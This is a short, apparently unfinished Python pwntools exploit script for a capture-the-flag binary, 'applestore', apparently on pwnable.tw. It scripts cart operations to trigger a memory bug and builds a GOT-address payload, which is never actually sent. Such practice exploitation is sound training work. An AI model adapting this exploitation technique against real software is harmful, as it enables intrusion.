from pwn import *
import sys

def add(no):
	print p.recv()
	p.sendline("2")
	print p.recv()
	p.sendline(str(no))

def remove(no):
	print p.recv()
	p.sendline("3")
	print p.recv()
	p.sendline(str(no))

def show():
	print p.recv()
	p.sendline("4")
	print p.recv()
	p.sendline("y")

def checkout():
	print p.recv()
	p.sendline("5")
	print p.recv()
	p.sendline("y")

target = "./applestore"
libc = "./libc_32.so.6"
binary = ELF(target)

if len(sys.argv) == 1:
	p = process(target, env={"LD_PRELOAD":libc})
else:
	p = remote("chall.pwnable.tw", 10104)

for i in range(6):
	add(1)
for i in range(20):
	add(2)

checkout()

print p.recv()
payload = "a"*6
payload += p32(binary.got["read"])
p.sendline()

p.interactive()
